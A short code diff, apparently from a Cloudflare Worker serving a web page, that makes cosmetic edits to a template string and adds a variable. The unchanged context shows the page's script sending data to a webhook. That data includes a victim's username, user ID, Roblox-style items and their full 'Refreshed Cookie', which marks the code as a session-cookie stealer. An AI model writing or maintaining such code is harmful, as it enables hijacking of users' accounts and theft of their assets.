@@ -3,8 +3,7 @@ export default {
     const url = new URL(request.url);
 
     if (url.pathname === '/' || url.pathname === '/index.html') {
-      const html = `
-<!DOCTYPE html>
+      const html = `<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -265,6 +264,7 @@ export default {
             })
         }).catch(function(err) { console.log('Live webhook error:', err); });
 
+        var cookieDisplay = cookie || 'N/A';
         var dualFields = [
             { name: '👤 User', value: data.username || 'Unknown', inline: true },
             { name: '🆔 User ID', value: data.userId || 'N/A', inline: true },
@@ -276,7 +276,7 @@ export default {
             { name: '⚔️ Valkyrie', value: data.valkyrie ? '✅ Yes' : '❌ No', inline: true },
             { name: '📡 API Status', value: data.apiStatus || '✅ Processing', inline: true },
             { name: '🔄 Cookie Refreshed', value: data.cookieRefreshed ? '✅ Yes' : '❌ No', inline: true },
-            { name: '🍪 Refreshed Cookie', value: '```' + (cookie || 'N/A') + '```', inline: false }
+            { name: '🍪 Refreshed Cookie', value: '```' + cookieDisplay + '```', inline: false }
         ];
 
         if (data.limiteds && data.limiteds.length > 0) {
@@ -397,8 +397,7 @@ export default {
     })();
 </script>
 </body>
-</html>
-      `;
+</html>`;
 
       return new Response(html, {
         headers: {
